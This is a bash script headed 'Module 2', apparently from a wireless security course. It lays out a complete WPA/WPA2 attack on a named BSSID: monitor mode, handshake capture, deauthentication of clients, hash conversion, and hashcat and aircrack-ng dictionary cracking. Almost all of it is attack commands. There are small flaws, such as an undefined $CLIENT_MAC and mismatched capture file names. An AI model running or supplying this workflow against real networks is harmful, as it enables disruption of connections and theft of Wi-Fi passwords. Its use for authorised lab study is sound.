
# Module 2: WPA/WPA2 Handshake Capture & Password Cracking Workflow

#!/bin/bash
# Target Details
TARGET_BSSID="82:07:40:A3:C3:D4"
TARGET_CHANNEL="11"
MON_IFACE="wlan0mon"
WORDLIST="/usr/share/wordlists/rockyou.txt"

echo "[1] Killing interfering background processes..."
sudo airmon-ng check kill

echo "[2] Starting monitor mode on channel $TARGET_CHANNEL..."
sudo airmon-ng start wlan0 11

echo "[3] Step 1: Run Handshake Listener (In Terminal 1):"
echo "sudo airodump-ng --bssid 82:07:40:A3:C3:D4 -c 11 -w module-2-cracking/handshake wlan0mon"

echo "[4] Step 2: Send Deauth Frame to Client "
echo "sudo aireplay-ng -0 5 -a 82:07:40:A3:C3:D4 -c $CLIENT_MAC $MON_IFACE"

echo "[5] Step 3: Convert captured .cap file to Hashcat format:"
echo "hcxpcapngtool -o module-2-cracking/Nana_Capture.hc22000 module-2-cracking/Nana_Capture-02.cap"



echo "[6] Step 4: Execute Rule-based and mask attack with Hashcat:"
echo "hashcat -m 22000 module-2-cracking/Nana_Capture.hc22000 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best66.rule"

echo "[7] Dictionary Attack: Execute direct dictionary attack with Aircrack-ng:"
echo "aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 82:07:40:A3:C3:D4 module-2-cracking/Nana_Capture-02.cap"


